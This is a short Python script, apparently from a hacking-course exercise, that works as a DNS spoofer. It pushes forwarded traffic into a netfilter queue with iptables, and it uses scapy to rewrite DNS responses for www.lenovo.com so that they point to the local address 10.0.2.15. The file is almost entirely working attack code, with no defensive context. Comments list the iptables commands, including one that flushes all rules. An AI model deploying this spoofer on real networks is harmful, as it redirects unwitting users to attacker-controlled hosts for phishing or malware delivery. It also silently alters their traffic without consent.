#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.lenovo.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()

# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()

# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("Detected CTRL-C ..... Flushing IPTABLES")
    subprocess.call("iptables --flush", shell=True)


# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
#
# iptables -I FORWARD -j NFQUEUE --queue-num 0
#
# iptables --flush
